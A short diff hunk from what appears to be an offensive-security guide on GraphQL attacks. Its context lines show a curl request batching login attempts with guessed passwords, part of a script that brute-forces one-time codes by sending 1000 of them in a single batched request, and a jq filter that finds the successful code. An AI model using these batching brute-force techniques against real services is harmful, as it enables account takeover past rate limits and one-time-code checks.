@@ -417,7 +417,7 @@ curl -s -X POST https://target.com/graphql \
     {"query": "mutation { login(email: \"admin@target.com\", password: \"pass3\") { token } }"}
   ]'
 ```
-
+{% raw %}
 ```python title="batch_otp_bruteforce.py"
 # OTP brute-force via batching — 1000 codes in one request:
 import json
@@ -434,7 +434,7 @@ print(json.dumps(ops))
 # curl -X POST https://target.com/graphql -d @batch_otp.json | \
 #   jq '.[] | select(.data.verifyOTP.success == true)'
 ```
-
+{% endraw %}
 ---
 
 ### 7.3.4 Nested Query DoS
